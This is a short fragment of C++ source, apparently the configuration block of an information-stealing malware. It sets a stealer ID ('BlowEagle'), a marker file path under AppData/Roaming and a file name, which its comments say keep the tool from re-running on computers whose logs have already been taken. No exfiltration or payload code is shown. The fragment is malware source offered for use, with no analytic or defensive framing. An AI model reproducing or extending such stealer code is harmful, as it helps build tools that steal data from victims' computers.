...
namespace config {
	...
	const char yourStealerId[10] = "BlowEagle"; //id that is used to avoid restarting on a computer from which logs have already been take, use for zip to
	const std::string pathId = "/AppData/Roaming/Settings"; // path to txt where will be id, no more than one additional folder after Roaming
	const std::string nameId = "win_sucks.txt"; // name of txt where will be id
}
